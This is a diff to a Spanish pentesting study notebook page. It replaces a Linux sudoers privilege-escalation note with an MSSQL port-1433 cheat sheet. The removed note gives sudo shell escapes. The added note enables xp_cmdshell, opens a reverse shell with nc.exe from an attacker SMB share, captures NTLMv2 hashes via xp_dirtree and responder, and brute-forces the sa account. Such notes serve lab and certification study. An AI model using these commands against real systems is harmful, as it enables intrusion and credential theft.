@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Sudoers | Notebook</title>
+    <title>1433 - MSSQL | Notebook</title>
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
@@ -42,7 +42,7 @@
               <a class="vault-file" href="/notebook/enumeracion-puertos/143-imap.html">143 - IMAP</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/161-snmp-udp.html">161 - SNMP (UDP)</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/389-636-3268-3269-ldap.html">389, 636, 3268, 3269 - LDAP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/1433-mssql.html">1433 - MSSQL</a>
+              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/1433-mssql.html">1433 - MSSQL</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/1521-oracle-database.html">1521 - Oracle Database</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/2049-nfs.html">2049 - NFS</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/3128-squid-proxy.html">3128 - Squid Proxy</a>
@@ -55,7 +55,7 @@
               <summary>Escalada de Privilegios</summary>
               <details class="vault-folder vault-subfolder" open>
                 <summary>Linux</summary>
-                <a class="vault-file is-active" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
               </details>
@@ -66,9 +66,9 @@
           </nav>
         </aside>
 
-        <article class="note-panel is-active" id="sudoers">
+        <article class="note-panel is-active" id="1433-mssql">
           <div class="note-tabbar">
-            <span>Sudoers</span>
+            <span>1433 - MSSQL</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -77,64 +77,75 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Escalada de Privilegios/Linux</span>
+            <span>~/notebook/Enumeración de Puertos</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">escalada de privilegios / linux / sudoers</p>
-            <h2>Sudoers</h2>
-
-            <p><code>/etc/sudoers</code> es el archivo de configuración que define quién puede usar <code>sudo</code> y qué comandos puede ejecutar como otro usuario, normalmente <code>root</code>.</p>
+            <p class="eyebrow">enumeración de puertos / mssql</p>
+            <h2>1433 - MSSQL</h2>
 
             <section class="code-card">
-              <h3>Listar comandos que podemos ejecutar como otro usuario</h3>
-              <pre><code>sudo -l
-
-# Output
-student ALL=(root) NOPASSWD: /usr/bin/man</code></pre>
+              <h3>Acceso a MSSQL</h3>
+              <pre><code>impacket-mssqlclient &lt;user&gt;:&lt;password&gt;@&lt;ip_target&gt;
+# Windows Server
+impacket-mssqlclient &lt;domain&gt;/&lt;user&gt;@&lt;ip_target&gt; -windows-auth</code></pre>
             </section>
 
-            <p><a href="https://gtfobins.github.io/#+sudo">GTFOBins SUDO</a></p>
-
             <section class="code-card">
-              <h3>Ejecutar binarios permitidos como otro usuario</h3>
-              <pre><code># Para usuario pepe
-sudo -u pepe git -p help config
+              <h3>Comandos para habilitar xp_cmdshell</h3>
+              <pre><code>help # Enumera comandos útiles
+# Habilitar ejecución de comandos
+enable_xp_cmdshell 
+# Alternativa
+EXEC sp_configure &#x27;show advanced options&#x27;,1;
+RECONFIGURE;
+EXEC sp_configure &#x27;xp_cmdshell&#x27;,1; 
+RECONFIGURE;-- 
 
-# Para root
-sudo git -p help config</code></pre>
+# Ejecución de comandos
+EXEC xp_cmdshell &quot;whoami&quot; 
+# Reverse Shell con SMB server desde Kali
+EXEC xp_cmdshell &quot;\\kali\smb\nc.exe kali 443 -e cmd&quot;
+
+# Ver usuario actual
+select system_user; 
+# Ver usuarios con rol adminstrador
+select loginname from syslogins where sysadmin = 1; 
+EXECUTE AS LOGIN = &#x27;&lt;user&gt;&#x27; # Cambiar de usuario 
+
+# Ver usuarios que permiten la suplantación de identidad
+enum_impersonate
+# Alternativa
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#x27;IMPERSONATE&#x27;</code></pre>
             </section>
 
-            <h2>Binarios No Contemplados en GTFOBins</h2>
+            <section class="code-card">
+              <h3>Leer directorios del servidor</h3>
+              <pre><code>xp_dirtree C:\inetpub\wwwroot\</code></pre>
+            </section>
 
             <section class="code-card">
-              <h3>mcedit</h3>
-              <pre><code>sudo mcedit
+              <h3>Capturar hash NTLMv2 del usuario que corre mssql</h3>
+              <pre><code>responder -I tun0 -v
+# mssql client
+EXEC xp_dirtree &#x27;\\&lt;kali_ip&gt;\test&#x27;
+EXEC MASTER.sys.xp_dirtree &#x27;\\&lt;kali_ip&gt;\test&#x27;</code></pre>
+            </section>
 
-# Comandos
-F+9
-
-# Ruta
-File -&gt; User menu -&gt; Invoke 'shell'</code></pre>
+            <section class="code-card">
+              <h3>Fuerza bruta -&gt; Credencial predeterminada: sa:</h3>
+              <pre><code>crackmapexec mssql &lt;ip_target&gt; -u sa -p &lt;dicc&gt; --local-auth</code></pre>
             </section>
 
             <h2>Tags</h2>
             <div class="tag-list">
-              <span>escalada_privilegios</span>
-              <span>sudoers</span>
-              <span>sudo</span>
-              <span>linux</span>
-              <span>gtfobins</span>
-              <span>privesc</span>
-              <span>misconfigurations</span>
-              <span>mcedit</span>
-            </div>
-
-            <h2>Máquinas Relacionadas</h2>
-            <div class="tag-list">
-              <span>Bashed</span>
-              <span>Nibbles</span>
-              <span>dog</span>
+              <span>ports</span>
+              <span>p1433</span>
+              <span>mssql</span>
+              <span>hta</span>
+              <span>xp_cmdshell</span>
+              <span>xp_dirtree</span>
+              <span>responder</span>
             </div>
           </div>
         </article>
